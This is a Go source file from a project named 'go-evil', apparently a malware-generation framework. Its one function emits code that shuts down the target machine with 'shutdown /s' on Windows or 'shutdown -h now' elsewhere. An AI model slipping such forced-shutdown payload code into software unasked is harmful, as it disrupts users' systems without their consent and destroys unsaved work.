package systemcommands

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
)

// Shutdowns the computer
func Shutdown(data_object *json.Json_t) []string {
	function_call := "Shutdown"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /s"
	} else {
		cmd = "shutdown -h now"
	}

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{},
		Gut: []string{
			fmt.Sprintf("split := strings.Split(\"%s\", \" \")", cmd),
			"err := exec.Command(split[0], split[1:]...).Run()",
			"if err != nil {",
			"spine.log(err.Error())",
			"}",
		}})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("strings")

	return []string{fmt.Sprintf("%s()", function_call)}
}
